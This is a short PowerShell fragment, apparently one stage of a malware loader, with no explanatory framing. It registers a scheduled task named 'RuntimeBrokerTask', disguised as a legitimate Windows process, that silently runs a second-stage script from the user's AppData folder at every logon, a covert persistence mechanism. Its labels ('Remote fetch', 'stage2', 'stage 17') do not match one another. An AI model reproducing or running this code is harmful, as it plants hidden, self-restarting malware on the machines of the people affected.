
<# Remote fetch #> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\stage2.ps1`""; $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName 'RuntimeBrokerTask' -Action $TaskAction -Trigger $TaskTrigger -Force; Write-Output "stage 17 initialized"
